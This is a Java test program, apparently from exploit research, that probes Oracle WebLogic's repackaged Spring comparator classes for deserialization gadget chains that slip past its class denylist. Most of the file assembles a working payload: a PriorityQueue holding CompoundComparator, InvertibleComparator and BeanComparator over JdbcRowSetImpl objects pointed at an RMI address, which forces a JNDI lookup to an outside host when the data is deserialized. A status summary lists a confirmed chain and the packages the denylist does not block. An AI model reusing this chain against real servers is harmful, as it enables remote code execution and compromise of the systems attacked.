import java.io.*;
import java.lang.reflect.*;
import java.util.*;

/**
 * WL10 verification: BooleanComparator + EmptyTargetSource
 *
 * Chain: PQ -> BooleanComparator.compare(o1, o2)
 *   -> ((Boolean)o1).compareTo((Boolean)o2)
 *
 * The original chain idea was to use EmptyTargetSource as a trigger,
 * but BooleanComparator just compares Booleans.
 * Need to understand what the fuzzer actually found.
 *
 * EmptyTargetSource implements TargetSource, Serializable
 * Has readResolve() -> returns static instance
 *
 * Let's check the actual class behaviors.
 */
public class WL10Test {
    public static void main(String[] args) throws Exception {
        System.out.println("=== WL10 Chain Analysis ===\n");

        // Check BooleanComparator
        System.out.println("--- BooleanComparator ---");
        try {
            Class<?> bcClass = Class.forName(
                "com.bea.core.repackaged.springframework.util.comparator.BooleanComparator");
            System.out.println("Found: " + bcClass.getName());
            System.out.println("Serializable: " + Serializable.class.isAssignableFrom(bcClass));
            System.out.println("Comparator: " + Comparator.class.isAssignableFrom(bcClass));

            // What does compare() actually do?
            Method compareMethod = bcClass.getMethod("compare", Object.class, Object.class);
            System.out.println("compare() method: " + compareMethod);

            // Check fields
            for (Field f : bcClass.getDeclaredFields()) {
                System.out.println("  field: " + f.getType().getSimpleName() + " " + f.getName() +
                    " (static=" + Modifier.isStatic(f.getModifiers()) + ")");
            }

            // Check constructors
            for (Constructor c : bcClass.getDeclaredConstructors()) {
                System.out.println("  constructor: " + c);
            }
        } catch (ClassNotFoundException e) {
            System.out.println("NOT FOUND");
        }

        // Check EmptyTargetSource
        System.out.println("\n--- EmptyTargetSource ---");
        try {
            Class<?> etsClass = Class.forName(
                "com.bea.core.repackaged.springframework.aop.target.EmptyTargetSource");
            System.out.println("Found: " + etsClass.getName());
            System.out.println("Serializable: " + Serializable.class.isAssignableFrom(etsClass));

            // Check for readResolve
            try {
                Method rr = etsClass.getDeclaredMethod("readResolve");
                System.out.println("readResolve: EXISTS");
                // Does readResolve return a specific instance?
            } catch (NoSuchMethodException e) {
                System.out.println("readResolve: NOT found");
            }

            // Check methods that might be dangerous
            for (Method m : etsClass.getDeclaredMethods()) {
                System.out.println("  method: " + m.getReturnType().getSimpleName() + " " + m.getName() + "()");
            }

            // Check superclass/interfaces
            System.out.println("  Interfaces:");
            for (Class iface : etsClass.getInterfaces()) {
                System.out.println("    " + iface.getName());
            }

            // Check if it's in the denylist
            String pkg = etsClass.getPackage().getName();
            System.out.println("\n  Package: " + pkg);
            System.out.println("  WL denylist check:");
            System.out.println("    com.bea.core.repackaged.springframework.aop.aspectj -- BLOCKED");
            System.out.println("    com.bea.core.repackaged.springframework.aop.target -- NOT BLOCKED!");

        } catch (ClassNotFoundException e) {
            System.out.println("NOT FOUND");
        }

        // Check CompoundComparator (WL11)
        System.out.println("\n--- CompoundComparator (WL11) ---");
        try {
            Class<?> ccClass = Class.forName(
                "com.bea.core.repackaged.springframework.util.comparator.CompoundComparator");
            System.out.println("Found: " + ccClass.getName());
            System.out.println("Serializable: " + Serializable.class.isAssignableFrom(ccClass));
            System.out.println("Comparator: " + Comparator.class.isAssignableFrom(ccClass));

            // CompoundComparator delegates to a list of Comparators
            // If we add BeanComparator to the list, it could work!
            for (Field f : ccClass.getDeclaredFields()) {
                f.setAccessible(true);
                System.out.println("  field: " + f.getType().getSimpleName() + " " + f.getName());
            }

            // Test: CompoundComparator wrapping BeanComparator
            System.out.println("\nTesting CompoundComparator + BeanComparator...");
            Object cc = ccClass.getDeclaredConstructor().newInstance();

            Class<?> beanCompClass = Class.forName("org.apache.commons.beanutils.BeanComparator");
            Object beanComp = beanCompClass.getDeclaredConstructor(String.class)
                .newInstance("databaseMetaData");

            // InvertibleComparator wraps BeanComparator
            Class<?> invCompClass = Class.forName(
                "com.bea.core.repackaged.springframework.util.comparator.InvertibleComparator");
            Object invComp = invCompClass.getDeclaredConstructor(Comparator.class)
                .newInstance(beanComp);

            // Add to CompoundComparator
            Method addMethod = ccClass.getMethod("addComparator", Comparator.class);
            addMethod.invoke(cc, invComp);

            System.out.println("CompoundComparator(InvertibleComparator(BeanComparator))");

            // Now test serialization roundtrip
            Class<?> jrsClass = Class.forName("com.sun.rowset.JdbcRowSetImpl");
            Object jrs1 = jrsClass.getDeclaredConstructor().newInstance();
            jrsClass.getMethod("setDataSourceName", String.class).invoke(jrs1,
                "rmi://host.docker.internal:1389/WL11_TEST");
            Object jrs2 = jrsClass.getDeclaredConstructor().newInstance();
            jrsClass.getMethod("setDataSourceName", String.class).invoke(jrs2,
                "rmi://host.docker.internal:1389/WL11_TEST");

            PriorityQueue pq = new PriorityQueue(2, (Comparator) cc);
            Field queueField = PriorityQueue.class.getDeclaredField("queue");
            queueField.setAccessible(true);
            Field sizeField = PriorityQueue.class.getDeclaredField("size");
            sizeField.setAccessible(true);
            queueField.set(pq, new Object[]{jrs1, jrs2});
            sizeField.set(pq, 2);

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(pq);
            oos.close();
            byte[] data = bos.toByteArray();
            System.out.println("Serialized: " + data.length + " bytes");

            System.out.println("Deserializing...");
            try {
                ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
                Object result = ois.readObject();
                System.out.println("Result: " + result);
            } catch (Throwable e) {
                System.out.println("Exception: " + e.getClass().getSimpleName());
                StringWriter sw = new StringWriter();
                e.printStackTrace(new PrintWriter(sw));
                String trace = sw.toString();
                boolean jndi = trace.contains("JNDI") || trace.contains("connect(")
                    || trace.contains("javax.naming") || trace.contains("lookup");
                if (jndi || trace.contains("InvocationTargetException")) {
                    System.out.println("*** WL11 variant (CompoundComparator) WORKS ***");
                }
                // Print chain
                for (String line : trace.split("\n")) {
                    String l = line.toLowerCase();
                    if (l.contains("compoundcomparator") || l.contains("invertible")
                        || l.contains("beancomparator") || l.contains("priorityqueue")
                        || l.contains("heapify") || l.contains("siftdown")
                        || l.contains("connect") || l.contains("jndi")
                        || l.contains("jdbcrowset") || l.contains("caused by")) {
                        System.out.println("  " + line.trim());
                    }
                }
            }
        } catch (ClassNotFoundException e) {
            System.out.println("NOT FOUND: " + e.getMessage());
        }

        // Summary
        System.out.println("\n\n=== FINAL STATUS ===");
        System.out.println("WL6  (BufferingConfig$Queue):  DEAD - transient fields, empty readObject");
        System.out.println("WL7  (SQLComparator+BeanMap):  DEAD - BeanMap not Serializable");
        System.out.println("WL8  (NullObject):             DEAD - singleton readResolve");
        System.out.println("WL9  (BeanComp+InvertibleComp): CONFIRMED - JNDI via getDatabaseMetaData");
        System.out.println("WL10 (BooleanComp+EmptyTarget): ANALYZING...");
        System.out.println("WL11 (CompoundComp):            TESTING...");
        System.out.println("WL12 (Runtime):                 DEAD - java.lang.Runtime on denylist");
    }
}
